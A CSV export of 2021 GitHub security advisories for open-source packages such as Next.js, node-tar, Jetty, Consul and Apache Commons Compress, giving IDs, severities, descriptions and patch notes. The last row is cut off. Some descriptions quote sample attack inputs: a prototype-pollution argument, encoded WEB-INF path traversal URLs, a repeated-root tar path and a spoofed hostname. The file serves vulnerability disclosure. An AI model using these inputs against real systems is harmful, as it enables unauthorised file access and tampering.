vulnerability_id,tool_id,tool_name,ghsa_id,cve_id,url,severity,published_at,summary,description,ecosystem
1,16863,next,GHSA-vxf5-wxwp-m7g9,CVE-2021-37699,https://github.com/advisories/GHSA-vxf5-wxwp-m7g9,moderate,2021-08-12 14:51:14 UTC,Open Redirect in Next.js,"Next.js is an open source website development framework to be used with the React library. In affected versions specially encoded paths could be used when `pages/_error.js` was statically generated, allowing an open redirect to occur to an external site. In general, this redirect does not directly harm users although it can allow for phishing attacks by redirecting to an attacker's domain from a trusted domain.

### Impact

- **Affected:** Users of Next.js between `10.0.5` and `10.2.0`
- **Affected:** Users of Next.js between `11.0.0` and `11.0.1` using `pages/_error.js` without `getInitialProps`
- **Affected:** Users of Next.js between `11.0.0` and `11.0.1` using `pages/_error.js` and `next export`
- **Not affected**: Deployments on Vercel ([vercel.com](https://vercel.com)) are not affected
- **Not affected:** Deployments **with** `pages/404.js`
- Note that versions prior to 0.9.9 package `next` npm package hosted a different utility (0.4.1 being the latest version of that codebase), and this advisory does not apply to those versions.

We recommend upgrading to the latest version of Next.js to improve the overall security of your application.

### Patches

https://github.com/vercel/next.js/releases/tag/v11.1.0",npm
2,16484,serve,GHSA-5rc4-8qqh-vq7f,CVE-2018-3718,https://github.com/advisories/GHSA-5rc4-8qqh-vq7f,moderate,2021-08-09 22:24:26 UTC,Handling of URL Encoding permitting access to ignored,serve node module suffers from Improper Handling of URL Encoding by permitting access to ignored files if a filename is URL encoded.,npm
3,12916,System.Text.RegularExpressions,GHSA-cmhx-cq75-c4mj,CVE-2019-0820,https://github.com/advisories/GHSA-cmhx-cq75-c4mj,moderate,2021-08-04 21:03:46 UTC,Regular Expression Denial of Service (ReDoS),"A denial of service vulnerability exists when .NET Framework and .NET Core improperly process RegEx strings, aka '.NET Framework and .NET Core Denial of Service Vulnerability'. This CVE ID is unique from CVE-2019-0980, CVE-2019-0981.",nuget
4,16466,tar,GHSA-3jfq-g458-7qm9,CVE-2021-32804,https://github.com/advisories/GHSA-3jfq-g458-7qm9,high,2021-08-03 19:06:36 UTC,Arbitrary File Creation/Overwrite due to insufficient absolute path sanitization,"### Impact

Arbitrary File Creation, Arbitrary File Overwrite, Arbitrary Code Execution

`node-tar` aims to prevent extraction of absolute file paths by turning absolute paths into relative paths when the `preservePaths` flag is not set to `true`. This is achieved by stripping the absolute path root from any absolute file paths contained in a tar file. For example `/home/user/.bashrc` would turn into `home/user/.bashrc`. 

This logic was insufficient when file paths contained repeated path roots such as `////home/user/.bashrc`. `node-tar` would only strip a single path root from such paths. When given an absolute file path with repeating path roots, the resulting path (e.g. `///home/user/.bashrc`) would still resolve to an absolute path, thus allowing arbitrary file creation and overwrite. 

### Patches

3.2.2 || 4.4.14 || 5.0.6 || 6.1.1

NOTE: an adjacent issue [CVE-2021-32803](https://github.com/npm/node-tar/security/advisories/GHSA-r628-mhmh-qjhw) affects this release level. Please ensure you update to the latest patch levels that address CVE-2021-32803 as well if this adjacent issue affects your `node-tar` use case.

### Workarounds

Users may work around this vulnerability without upgrading by creating a custom `onentry` method which sanitizes the `entry.path` or a `filter` method which removes entries with absolute paths.

```js
const path = require('path')
const tar = require('tar')

tar.x({
  file: 'archive.tgz',
  // either add this function...
  onentry: (entry) => {
    if (path.isAbsolute(entry.path)) {
      entry.path = sanitizeAbsolutePathSomehow(entry.path)
      entry.absolute = path.resolve(entry.path)
    }
  },

  // or this one
  filter: (file, entry) => {
    if (path.isAbsolute(entry.path)) {
      return false
    } else {
      return true
    }
  }
})
```

Users are encouraged to upgrade to the latest patch versions, rather than attempt to sanitize tar input themselves.",npm
5,16466,tar,GHSA-r628-mhmh-qjhw,CVE-2021-32803,https://github.com/advisories/GHSA-r628-mhmh-qjhw,high,2021-08-03 19:00:40 UTC,Arbitrary File Creation/Overwrite via insufficient symlink protection due to directory cache poisoning,"### Impact

Arbitrary File Creation, Arbitrary File Overwrite, Arbitrary Code Execution

`node-tar` aims to guarantee that any file whose location would be modified by a symbolic link is not extracted. This is, in part, achieved by ensuring that extracted directories are not symlinks.  Additionally, in order to prevent unnecessary `stat` calls to determine whether a given path is a directory, paths are cached when directories are created.

This logic was insufficient when extracting tar files that contained both a directory and a symlink with the same name as the directory. This order of operations resulted in the directory being created and added to the `node-tar` directory cache. When a directory is present in the directory cache, subsequent calls to mkdir for that directory are skipped. However, this is also where `node-tar` checks for symlinks occur.

By first creating a directory, and then replacing that directory with a symlink, it was thus possible to bypass `node-tar` symlink checks on directories, essentially allowing an untrusted tar file to symlink into an arbitrary location and subsequently extracting arbitrary files into that location, thus allowing arbitrary file creation and overwrite.

This issue was addressed in releases 3.2.3, 4.4.15, 5.0.7 and 6.1.2.

### Patches

3.2.3 || 4.4.15 || 5.0.7 || 6.1.2

### Workarounds

Users may work around this vulnerability without upgrading by creating a custom `filter` method which prevents the extraction of symbolic links.

```js
const tar = require('tar')

tar.x({
  file: 'archive.tgz',
  filter: (file, entry) => {
    if (entry.type === 'SymbolicLink') {
      return false
    } else {
      return true
    }
  }
})
```

Users are encouraged to upgrade to the latest patch versions, rather than attempt to sanitize tar input themselves.",npm
6,16502,xmldom,GHSA-5fg8-2547-mr8q,CVE-2021-32796,https://github.com/advisories/GHSA-5fg8-2547-mr8q,moderate,2021-08-03 16:57:05 UTC,Misinterpretation of malicious XML input,"### Impact
xmldom versions 0.6.0 and older do not correctly escape special characters when serializing elements removed from their ancestor. This may lead to unexpected syntactic changes during XML processing in some downstream applications.

### Patches
Update to one of the fixed versions of `@xmldom/xmldom` (`>=0.7.0`)

See issue #271 for the status of publishing `xmldom` to npm or join #270 for Q&A/discussion until it's resolved.

### Workarounds

Downstream applications can validate the input and reject the maliciously crafted documents.

### References

Similar to this one reported on the Go standard library:

- https://mattermost.com/blog/coordinated-disclosure-go-xml-vulnerabilities/
- https://mattermost.com/blog/securing-xml-implementations-across-the-web/

### For more information

If you have any questions or comments about this advisory:

* Open an issue in [`xmldom/xmldom`](https://github.com/xmldom/xmldom)
* Email us: send an email to **all** addresses that are shown by `npm owner ls @xmldom/xmldom`
",npm
7,30537,Zope,GHSA-g4gq-j4p2-j8fr,CVE-2021-32811,https://github.com/advisories/GHSA-g4gq-j4p2-j8fr,high,2021-08-05 17:00:37 UTC,Remote Code Execution via Script (Python) objects under Python 3,"### Impact
Background: The optional add-on package `Products.PythonScripts` adds `Script (Python)` to the list of content items a user can add to the Zope object database. Inside these scripts users can write Python code that is executed when rendered through the web. The code environment in these script objects is limited, it relies on the `RestrictedPython` package to provide a ""safe"" subset of Python instructions as well as the `AccessControl` package that defines security policies for execution in the context of a Zope application.

Recently the `AccessControl` package was updated to fix a remote code execution security issue. A link to the security advisory is provided in the References section below. The bug tightens the `AccessControl` security policies for Zope by blocking access to unsafe classes inside the Python `string` module.

You are only affected if the following are true:

- You use Python 3 for your Zope deployment (Zope 4 on Python 2 is not affected)
- You run Zope 4 below version 4.6.3 or Zope 5 below version 5.3
- You have installed the optional `Products.PythonScripts` add-on package

By default, you need to have the admin-level Zope ""Manager"" role to add or edit Script (Python) objects through the web. Only sites that allow untrusted users to add/edit these scripts through the web - which would be a very unusual configuration to begin with - are at risk.

### Patches
The problem has been fixed in `AccessControl` versions 4.3 and 5.2. Zope releases 4.6.3 and 5.3 now require these new `AccessControl` releases.

### Workarounds
A site administrator can restrict adding/editing Script (Python) objects through the web using the standard Zope user/role permission mechanisms. Untrusted users should not be assigned the Zope Manager role and adding/editing these scripts through the web should be restricted to trusted users only. This is the default configuration in Zope.

### References
* [AccessControl security advisory GHSA-qcx9-j53g-ccgf](https://github.com/zopefoundation/AccessControl/security/advisories/GHSA-qcx9-j53g-ccgf)

### For more information
If you have any questions or comments about this advisory:
* Open an issue in the [Zope issue tracker](https://github.com/zopefoundation/Zope/issues)
* Email us at [security@plone.org](mailto:security@plone.org)

",pip
8,16628,jszip,GHSA-jg8v-48h5-wgxg,CVE-2021-23413,https://github.com/advisories/GHSA-jg8v-48h5-wgxg,moderate,2021-08-10 16:02:18 UTC,Prototype Pollution,"This affects the package jszip before 3.7.0. Crafting a new zip file with filenames set to Object prototype values (e.g __proto__, toString, etc) results in a returned object with a modified prototype instance.",npm
9,16942,url-parse,GHSA-hh27-ffr2-f2jc,CVE-2021-3664,https://github.com/advisories/GHSA-hh27-ffr2-f2jc,moderate,2021-08-10 16:07:08 UTC,Open redirect in url-parse,"# Overview

Affected versions of npm `url-parse` are vulnerable to URL Redirection to Untrusted Site.

# Impact

Depending on library usage and attacker intent, impacts may include allow/block list bypasses, SSRF attacks, open redirects, or other undesired behavior.",npm
10,34041,org.elasticsearch:elasticsearch,GHSA-3393-hvrj-w7v3,CVE-2021-22144,https://github.com/advisories/GHSA-3393-hvrj-w7v3,moderate,2021-08-09 20:41:17 UTC,Denial of Service in Elasticsearch,In Elasticsearch versions before 7.13.3 and 6.8.17 an uncontrolled recursion vulnerability that could lead to a denial of service attack was identified in the Elasticsearch Grok parser. A user with the ability to submit arbitrary queries to Elasticsearch could create a malicious Grok query that will crash the Elasticsearch node.,maven
11,30443,vyper,GHSA-7f92-rr6w-cq64,,https://github.com/advisories/GHSA-7f92-rr6w-cq64,high,2021-08-05 16:57:42 UTC,Storage corruption due to variables overwritten by re-entrancy locks,"### Background
When attempting to use the v0.2.14 release, @pandadefi discovered an issue using the `@nonreentrant` decorator.

### Impact
Reentrancy protection storage slots get allocated to the same slots as storage variables, leading to the corruption of storage variables when using the `@nonreentrant` decorator.

### Patches
This issue was fixed in v0.2.15 in #2391, #2379

### Workarounds
Don't use the `@nonreentrant` decorator in these versions.",pip
12,17668,video.js,GHSA-pp7m-6j83-m7r6,CVE-2021-23414,https://github.com/advisories/GHSA-pp7m-6j83-m7r6,moderate,2021-08-10 16:09:36 UTC,Cross-site Scripting in video.js,"This affects the package video.js before 7.14.3.
 The src attribute of track tag allows to bypass HTML escaping and execute arbitrary code.

",npm
13,38620,org.apache.juddi:juddi-core,GHSA-9hx8-2mrv-r674,CVE-2021-37578,https://github.com/advisories/GHSA-9hx8-2mrv-r674,critical,2021-08-09 20:41:37 UTC,Deserialization of Untrusted Data in Apache jUDDI,"Apache jUDDI uses several classes related to Java's Remote Method Invocation (RMI) which (as an extension to UDDI) provides an alternate transport for accessing UDDI services.

RMI uses the default Java serialization mechanism to pass parameters in RMI invocations. A remote attacker can send a malicious serialized object to the above RMI entries. The objects get deserialized without any check on the incoming data. In the worst case, it may let the attacker run arbitrary code remotely. 

For both jUDDI web service applications and jUDDI clients, the usage of RMI is disabled by default. Since this is an optional feature and an extension to the UDDI protocol, the likelihood of impact is low. Starting with 3.3.10, all RMI related code was removed.",maven
14,15554,OPCFoundation.NetStandard.Opc.Ua,GHSA-9q94-v7ch-mxqw,CVE-2020-8867,https://github.com/advisories/GHSA-9q94-v7ch-mxqw,moderate,2021-08-02 17:35:42 UTC,Insufficient Session Expiration and TOCTOU Race Condition in OPC FOundation UA .Net Standard,This vulnerability allows remote attackers to create a denial-of-service condition on affected installations of OPC Foundation UA .NET Standard 1.04.358.30. Authentication is not required to exploit this vulnerability. The specific flaw exists within the handling of sessions. The issue results from the lack of proper locking when performing operations on an object. An attacker can leverage this vulnerability to create a denial-of-service condition against the application. Was ZDI-CAN-10295.,nuget
15,22634,vault,GHSA-fp52-qw33-mfmw,CVE-2020-16250,https://github.com/advisories/GHSA-fp52-qw33-mfmw,critical,2021-08-02 17:11:41 UTC,Authentication Bypass by Spoofing and Insufficient Verification of Data Authenticity in Hashicorp Vault,"HashiCorp Vault and Vault Enterprise versions 0.7.1 and newer, when configured with the AWS IAM auth method, may be vulnerable to authentication bypass. Fixed in 1.2.5, 1.3.8, 1.4.4, and 1.5.1..",go
16,34605,org.apache.sshd:sshd-core,GHSA-9279-7hph-r3xw,CVE-2021-30129,https://github.com/advisories/GHSA-9279-7hph-r3xw,high,2021-08-02 16:54:09 UTC,Buffer Overflow in Apache Mina SSHD,A vulnerability in sshd-core of Apache Mina SSHD allows an attacker to overflow the server causing an OutOfMemory error. This issue affects the SFTP and port forwarding features of Apache Mina SSHD version 2.0.0 and later versions. It was addressed in Apache Mina SSHD 2.7.0,maven
17,17207,yargs-parser,GHSA-p9pc-299p-vxgp,CVE-2020-7608,https://github.com/advisories/GHSA-p9pc-299p-vxgp,moderate,2020-09-04 18:00:54 UTC,yargs-parser Vulnerable to Prototype Pollution,"Affected versions of `yargs-parser` are vulnerable to prototype pollution. Arguments are not properly sanitized, allowing an attacker to modify the prototype of `Object`, causing the addition or modification of an existing property that will exist on all objects.  
Parsing the argument `--foo.__proto__.bar baz'` adds a `bar` property with value `baz` to all objects. This is only exploitable if attackers have control over the arguments being passed to `yargs-parser`.



## Recommendation

Upgrade to versions 13.1.2, 15.0.1, 18.1.1 or later.",npm
18,34205,org.jdom:jdom,GHSA-2363-cqg2-863c,CVE-2021-33813,https://github.com/advisories/GHSA-2363-cqg2-863c,high,2021-07-27 19:02:56 UTC,XML External Entity (XXE) Injection in JDOM,"An XXE issue in SAXBuilder in JDOM through 2.0.6 allows attackers to cause a denial of service via a crafted HTTP request.  At this time there is not released fixed version of JDOM.  As a workaround, to avoid external entities being expanded, one can call `builder.setExpandEntities(false)` and they won't be expanded.",maven
19,22634,vault,GHSA-9vh5-r4qw-v3vv,CVE-2020-7220,https://github.com/advisories/GHSA-9vh5-r4qw-v3vv,high,2021-07-28 17:57:46 UTC,Improper Resource Shutdown or Release in HashiCorp Vault,"HashiCorp Vault Enterprise 0.11.0 through 1.3.1 fails, in certain circumstances, to revoke dynamic secrets for a mount in a deleted namespace. Fixed in 1.3.2.",go
20,22315,consul,GHSA-r9w6-rhh9-7v53,CVE-2020-7955,https://github.com/advisories/GHSA-r9w6-rhh9-7v53,moderate,2021-07-28 17:57:57 UTC,Incorrect Authorization in HashiCorp Consul,"HashiCorp Consul and Consul Enterprise 1.4.1 through 1.6.2 did not uniformly enforce ACLs across all API endpoints, resulting in potential unintended information disclosure. Fixed in 1.6.3.",go
21,32068,argo,GHSA-h8jc-jmrf-9h8f,CVE-2020-8828,https://github.com/advisories/GHSA-h8jc-jmrf-9h8f,high,2021-07-26 21:19:27 UTC,Improper Authentication and Insecure Default Initialization of Resource in Argo API,"As of v1.5.0, the default admin password is set to the argocd-server pod name. For insiders with access to the cluster or logs, this issue could be abused for privilege escalation, as Argo has privileged roles. A malicious insider is the most realistic threat, but pod names are not meant to be kept secret and could wind up just about anywhere.",go
22,24240,beego/session,GHSA-f6px-w8rh-7r89,CVE-2019-16354,https://github.com/advisories/GHSA-f6px-w8rh-7r89,moderate,2021-08-02 17:15:05 UTC,Data race in Beego,The File Session Manager in Beego 1.10.0 allows local users to read session files because there is a race condition involving file creation within a directory with weak permissions.,go
23,23183,containerd,GHSA-c72p-9xmj-rx3w,CVE-2021-32760,https://github.com/advisories/GHSA-c72p-9xmj-rx3w,moderate,2021-07-26 21:17:45 UTC,Archive package allows chmod of file outside of unpack target directory,"## Impact

A bug was found in containerd where pulling and extracting a specially-crafted container image can result in Unix file permission changes for existing files in the host’s filesystem.  Changes to file permissions can deny access to the expected owner of the file, widen access to others, or set extended bits like setuid, setgid, and sticky.  This bug does not directly allow files to be read, modified, or executed without an additional cooperating process.

## Patches

This bug has been fixed in containerd 1.5.4 and 1.4.8.  Users should update to these versions as soon as they are released.  Running containers do not need to be restarted.

## Workarounds

Ensure you only pull images from trusted sources.

Linux security modules (LSMs) like SELinux and AppArmor can limit the files potentially affected by this bug through policies and profiles that prevent containerd from interacting with unexpected files.

## For more information

If you have any questions or comments about this advisory:

* [Open an issue](https://github.com/containerd/containerd/issues/new/choose)
* Email us at security@containerd.io if you think you’ve found a security bug.",go
24,16064,react-native,GHSA-7f53-fmmv-mfjv,CVE-2020-1920,https://github.com/advisories/GHSA-7f53-fmmv-mfjv,high,2021-07-20 17:33:28 UTC,Regular expression denial of service in react-native,"A regular expression denial of service (ReDoS) vulnerability in the validateBaseUrl function can cause the application to use excessive resources, become unresponsive, or crash. This was introduced in react-native version 0.59.0 and fixed in version 0.64.1.",npm
25,16781,xlsx,GHSA-g973-978j-2c3p,CVE-2021-32014,https://github.com/advisories/GHSA-g973-978j-2c3p,moderate,2021-07-22 19:47:15 UTC,Denial of Service in SheetJS Pro,SheetJS Pro through 0.16.9 allows attackers to cause a denial of service (CPU consumption) via a crafted .xlsx document that is mishandled when read by xlsx.js.,npm
26,16781,xlsx,GHSA-3x9f-74h4-2fqr,CVE-2021-32012,https://github.com/advisories/GHSA-3x9f-74h4-2fqr,moderate,2021-07-22 19:48:17 UTC,Denial of Service in SheetJS Pro,SheetJS Pro through 0.16.9 allows attackers to cause a denial of service (memory consumption) via a crafted .xlsx document that is mishandled when read by xlsx.js (issue 1 of 2).,npm
27,16781,xlsx,GHSA-8vcr-vxm8-293m,CVE-2021-32013,https://github.com/advisories/GHSA-8vcr-vxm8-293m,moderate,2021-07-22 19:48:13 UTC,Denial of Service in SheetsJS Pro,SheetJS Pro through 0.16.9 allows attackers to cause a denial of service (memory consumption) via a crafted .xlsx document that is mishandled when read by xlsx.js (issue 2 of 2).,npm
28,38629,org.owasp.antisamy:antisamy,GHSA-9c8w-jrw3-q2c3,CVE-2021-35043,https://github.com/advisories/GHSA-9c8w-jrw3-q2c3,moderate,2021-08-02 16:58:43 UTC,Cross-site Scripting in OWASP AntiSamy,OWASP AntiSamy before 1.6.4 allows XSS via HTML attributes when using the HTML output serializer (XHTML is not affected). This was demonstrated by a javascript: URL with &#00058 as the replacement for the : character.,maven
29,22315,consul,GHSA-25gf-8qrr-g78r,CVE-2021-32574,https://github.com/advisories/GHSA-25gf-8qrr-g78r,high,2021-07-19 21:21:03 UTC,Missing SSL Certificate Validation in Hashicorp Consul,HashiCorp Consul before 1.10.1 (and Consul Enterprise) has Missing SSL Certificate Validation. xds does not ensure that the Subject Alternative Name of an upstream is validated.,go
30,22315,consul,GHSA-8h2g-r292-j8xh,CVE-2021-36213,https://github.com/advisories/GHSA-8h2g-r292-j8xh,high,2021-07-19 21:21:12 UTC,L7 deny intention results in an allow action,"In HashiCorp Consul before 1.10.1 (and Consul Enterprise), xds can generate a situation where a single L7 deny intention (with a default deny policy) results in an allow action.",go
31,17237,urijs,GHSA-89gv-h8wf-cg8r,CVE-2021-3647,https://github.com/advisories/GHSA-89gv-h8wf-cg8r,moderate,2021-07-19 21:22:36 UTC,Hostname spoofing via backslashes in URL,"### Impact
If using affected versions to determine a URL's hostname, the hostname can be spoofed by using a combination of backslash (`\`) and slash (`/`) characters as part of the scheme delimiter, e.g. `scheme:/\/\/\hostname`. If the hostname is used in security decisions, the decision may be incorrect.

Depending on library usage and attacker intent, impacts may include allow/block list bypasses, SSRF attacks, open redirects, or other undesired behavior.

Example URL: `https:/\/\/\expected-example.com/path`
Escaped string: `https:/\\/\\/\\expected-example.com/path` (JavaScript strings must escape backslash)

Affected versions incorrectly return no hostname. Patched versions correctly return `expected-example.com`. Patched versions match the behavior of other parsers which implement the [WHATWG URL specification](https://url.spec.whatwg.org/), including web browsers and [Node's built-in URL class](https://nodejs.org/api/url.html).

### Patches
Version 1.19.7 is patched against all known payload variants.

### References
https://github.com/medialize/URI.js/releases/tag/v1.19.7 (fix for this particular bypass)
https://github.com/medialize/URI.js/releases/tag/v1.19.6 (fix for related bypass)
https://github.com/medialize/URI.js/releases/tag/v1.19.4 (fix for related bypass)
https://github.com/medialize/URI.js/releases/tag/v1.19.3 (fix for related bypass)
[PR #233](https://github.com/medialize/URI.js/pull/233) (initial fix for backslash handling)

### For more information
If you have any questions or comments about this advisory, open an issue in https://github.com/medialize/URI.js

### Reporter credit
[ready-research](https://github.com/ready-research) via https://huntr.dev/",npm
32,33995,org.eclipse.jetty:jetty-webapp,GHSA-vjv5-gp2w-65vm,CVE-2021-34429,https://github.com/advisories/GHSA-vjv5-gp2w-65vm,moderate,2021-07-19 15:15:24 UTC,Encoded URIs can access WEB-INF directory in Eclipse Jetty,"### Description
URIs can be crafted using some encoded characters to access the content of the `WEB-INF` directory and/or bypass some security constraints.
This is a variation of the vulnerability reported in [CVE-2021-28164](https://nvd.nist.gov/vuln/detail/CVE-2021-28164)/[GHSA-v7ff-8wcx-gmc5](https://github.com/eclipse/jetty.project/security/advisories/GHSA-v7ff-8wcx-gmc5).

### Impact
The default compliance mode allows requests with URIs that contain a %u002e segment to access protected resources within the WEB-INF directory. For example, a request to `/%u002e/WEB-INF/web.xml` can retrieve the web.xml file. This can reveal sensitive information regarding the implementation of a web application.  Similarly, an encoded null character can prevent correct normalization so that /.%00/WEB-INF/web.xml cal also retrieve the web.xml file.

### Workarounds
Some Jetty [rewrite rules](https://www.eclipse.org/jetty/documentation/jetty-9/index.html#rewrite-handler) can be deployed to rewrite any request containing encoded dot segments or null characters in the raw request URI, to a known not found resource:
```xml
<Call name=""addRule"">
  <Arg>
    <New class=""org.eclipse.jetty.rewrite.handler.RewriteRegexRule"">
      <Set name=""regex"">.*/(?:\.+/)+.*</Set>
      <Set name=""replacement"">/WEB-INF/Not-Found</Set>
    </New>
  </Arg>
</Call>
<Call name=""addRule"">
  <Arg>
    <New class=""org.eclipse.jetty.rewrite.handler.ValidUrlRule""/>
  </Arg>
</Call>
```

### Analysis
Prior to 9.4.37, Jetty was protected from this style of attack by two lines of defense:
 + URIs were decoded first and then normalized for `.` and `..` sequences. Whilst this is not according to the RFC, it did remove relative segments that were encoded or parameterized and made the resulting URI paths safe from any repeated normalization (often done by URI manipulation and file system mapping).
 + The `FileResource` class treated any difference between absolute path and canonical path of a resource as an alias, and thus the resource would not be served by default.

Prior to 9.4.37, the `FileResource` class was replaced by the `PathResource` class that did not treat normalization differences as aliases.  Then release 9.4.37 updated the URI parsing to be compliant with the RFC, in that normalization is done before decoding.   This allowed various encodings or adornments to relative path segments that would not be normalized by the pure RFC URI normalization, but were normalized by the file system, thus allowing protected resources to be accessed via an alias.  Specifically by decoding URIs after normalization, it left them vulnerable to any subsequent normalization (potentially after checking security constraints) changing the URI singificantly.  Such extra normalization is often down by URI manipulation code and file systems.

With Jetty releases 9.4.43, 10.0.6, 11.0.6, we have restored several lines of defense:
 + URIs are first decoded and then normalized which is not strictly according to the current RFC.  Since the normalization is done after decoding, the URI paths produced are safe from further normalisation and the referenced resource cannot easily be so changed after passing security constraints.
 + During URI parsing checks are made for some specific segments/characters that are possible to be seen ambiguously by an application (e.g. encode dot segments, encoded separators, empty segments, parameterized dot segments and/or null characters). So even though Jetty code handles these URIs correctly, there is a risk that an application may not do so, thus such requests are rejected with a 400 Bad Request unless a specific compliance mode is set.
 + Once decoded and normalized by initial URI processing, Jetty will not decode or normalize a received URI again within its own resource handling. This avoids to possibility of double decode attacks.
 + The `ContextHandler.getResource(String path)` method always checks that the passed path is normalized, only accepting a non normal path if approved by an AliasChecker.  This is the method that is directly used by Jetty resource serving.
 + The API methods like `ServletContext.getResource(String path)` will normalize the  prior to calling `ContextHandler.getResource(String path)`. This allows applications to use non normal paths.
 + The `PathResource` class now considers any difference in normal/canonical name between a request resource name and the found resource name  to be an alias, which will only be served if approved by an explicit `AliasChecker`

In summary, the defense is a front line of detection of specific known URI alias attacks, with the last line defense of not allowing any aliasing of resources.

Many thanks to @cangqingzhe from @CloverSecLabs for reporting this issue. ",maven
33,33967,org.apache.ant:ant,GHSA-5v34-g2px-j4fw,CVE-2021-36374,https://github.com/advisories/GHSA-5v34-g2px-j4fw,moderate,2021-08-02 16:56:31 UTC,Improper Handling of Length Parameter Inconsistency in Apache Ant,"When reading a specially crafted ZIP archive, or a derived formats, an Apache Ant build can be made to allocate large amounts of memory that leads to an out of memory error, even for small inputs. This can be used to disrupt builds using Apache Ant. Commonly used derived formats from ZIP archives are for instance JAR files and many office files. Apache Ant prior to 1.9.16 and 1.10.11 were affected.",maven
34,33967,org.apache.ant:ant,GHSA-q5r4-cfpx-h6fh,CVE-2021-36373,https://github.com/advisories/GHSA-q5r4-cfpx-h6fh,moderate,2021-08-02 16:56:17 UTC,Improper Handling of Length Parameter Inconsistency in Apache Ant,"When reading a specially crafted TAR archive an Apache Ant build can be made to allocate large amounts of memory that finally leads to an out of memory error, even for small inputs. This can be used to disrupt builds using Apache Ant. Apache Ant prior to 1.9.16 and 1.10.11 were affected.",maven
35,34003,org.apache.commons:commons-compress,GHSA-mc84-pj99-q6hh,CVE-2021-36090,https://github.com/advisories/GHSA-mc84-pj99-q6hh,high,2021-08-02 16:55:53 UTC,Improper Handling of Length Parameter Inconsistency in Compress,"When reading a specially crafted ZIP archive, Compress can be made to allocate large amounts of memory that finally leads to an out of memory error even for very small inputs. This could be used to mount a denial of service attack against services that use Compress' zip package.",maven
36,12858,RestSharp,GHSA-9pq7-rcxv-47vq,CVE-2021-27293,https://github.com/advisories/GHSA-9pq7-rcxv-47vq,high,2021-07-14 19:10:01 UTC,Incorrect Regular Expression in RestSharp,"RestSharp < 106.11.8-alpha.0.13 uses a regular expression which is vulnerable to Regular Expression Denial of Service (ReDoS) when converting strings into DateTimes. If a server responds with a malicious string, the client using RestSharp will be stuck processing it for an exceedingly long time. Thus the remote server can trigger Denial of Service.",nuget
37,34003,org.apache.commons:commons-compress,GHSA-xqfj-vm6h-2x34,CVE-2021-35517,https://github.com/advisories/GHSA-xqfj-vm6h-2x34,high,2021-08-02 16:55:39 UTC,Improper Handling of Length Parameter Inconsistency in Compress,"When reading a specially crafted TAR archive, Compress can be made to allocate large amounts of memory that finally leads to an out of memory error even for very small inputs. This could be used to mount a denial of service attack against services that use Compress' tar package.",maven
38,34003,org.apache.commons:commons-compress,GHSA-crv7-7245-f45f,CVE-2021-35516,https://github.com/advisories/GHSA-crv7-7245-f45f,high,2021-08-02 16:55:15 UTC,Improper Handling of Length Parameter Inconsistency in Compress,"When reading a specially crafted 7Z archive, Compress can be made to allocate large amounts of memory that finally leads to an out of memory error even for very small inputs. This could be used to mount a denial of service attack against services that use Compress' sevenz package.",maven
39,34003,org.apache.commons:commons-compress,GHSA-7hfm-57qf-j43q,CVE-2021-35515,https://github.com/advisories/GHSA-7hfm-57qf-j43q,high,2021-08-02 16:55:07 UTC,Excessive Iteration in Compress,"When reading a specially crafted 7Z archive, the construction of the list of codecs that decompress an entry can result in an infinite loop. This could be used to mount a denial of service attack against services that use Compress' sevenz package.",maven
40,34577,org.apache.solr:solr-core,GHSA-mh7g-99w9-xpjm,CVE-2017-12629,https://github.com/advisories/GHSA-mh7g-99w9-xpjm,critical,2018-10-17 19:56:17 UTC,Remote code execution occurs in Apache Solr,"Remote code execution occurs in Apache Solr before versions 5.5.5, 6.6.2 and 7.1.0 by exploiting XXE in conjunction with use of a Config API add-listener command to reach the RunExecutableListener class. Elasticsearch, although it uses Lucene, is NOT vulnerable to this. Note that the XML external entity expansion vulnerability occurs in the XML Query Parser which is available, by default, for any query request with parameters deftype=xmlparser and can be exploited to upload malicious data to the /upload request handler or as Blind XXE using ftp wrapper in order to read arbitrary local files from the Solr server. Note also that the second vulnerability relates to remote code execution using the RunExecutableListener available on all affected versions of Solr",maven
41,18870,addressable,GHSA-jxhc-q857-3j6g,CVE-2021-32740,https://github.com/advisories/GHSA-jxhc-q857-3j6g,high,2021-07-12 16:58:33 UTC,Regular Expression Denial of Service in Addressable templates,"### Impact

Within the URI template implementation in Addressable, a maliciously crafted template may result in uncontrolled resource consumption, leading to denial of service when matched against a URI. In typical usage, templates would not normally be read from untrusted user input, but nonetheless, no previous security advisory for Addressable has cautioned against doing this. Users of the parsing capabilities in Addressable but not the URI template capabilities are unaffected.

### Patches

The vulnerability was introduced in version 2.3.0 (previously yanked) and has been present in all subsequent versions up to, and including, 2.7.0. It is fixed in version 2.8.0.

### Workarounds

The vulnerability can be avoided by only creating Template objects from trusted sources that have been validated not to produce catastrophic backtracking.

### References

- https://owasp.org/www-community/attacks/Regular_expression_Denial_of_Service_-_ReDoS
- https://cwe.mitre.org/data/definitions/1333.html
- https://www.regular-expressions.info/catastrophic.html

### For more information
If you have any questions or comments about this advisory:
* [Open an issue](https://github.com/sporkmonger/addressable/issues)
",rubygems
42,34025,org.springframework.security:spring-security-core,GHSA-w9jg-gvgr-354m,CVE-2021-22119,https://github.com/advisories/GHSA-w9jg-gvgr-354m,high,2021-07-02 18:33:34 UTC,Resource Exhaustion in Spring Security,"Spring Security versions 5.5.x prior to 5.5.1, 5.4.x prior to 5.4.7, 5.3.x prior to 5.3.10 and 5.2.x prior to 5.2.11 are susceptible to a Denial-of-Service (DoS) attack via the initiation of the Authorization Request in an OAuth 2.0 Client Web and WebFlux application. A malicious user or attacker can send multiple requests initiating the Authorization Request for the Authorization Code Grant, which has the potential of exhausting system resources using a single session or multiple sessions.",maven
43,34054,org.apache.thrift:libthrift,GHSA-g2fg-mr77-6vrm,CVE-2020-13949,https://github.com/advisories/GHSA-g2fg-mr77-6vrm,high,2021-03-12 21:33:55 UTC,Uncontrolled Resource Consumption in Apache Thrift,"In Apache Thrift 0.9.3 to 0.13.0, malicious RPC clients could send short messages which would result in a large memory allocation, potentially leading to denial of service.",maven
44,36737,io.ratpack:ratpack-core,GHSA-w6rq-6h34-vh7q,CVE-2021-29479,https://github.com/advisories/GHSA-w6rq-6h34-vh7q,high,2021-07-01 17:02:38 UTC,Cached redirect poisoning via X-Forwarded-Host header,"A user supplied `X-Forwarded-Host` header can be used to perform cache poisoning of a cache fronting a Ratpack server if the cache key does not include the `X-Forwarded-Host` header as a cache key.

Users are only vulnerable if they do not configure a custom `PublicAddress` instance. A custom `PublicAddress` can be specified by using [ServerConfigBuilder::publicAddress](https://ratpack.io/manual/current/api/ratpack/server/ServerConfigBuilder.html#publicAddress-java.net.URI-). For versions prior to 1.9.0, by default, Ratpack utilizes an inferring version of `PublicAddress` which is vulnerable.

### Impact

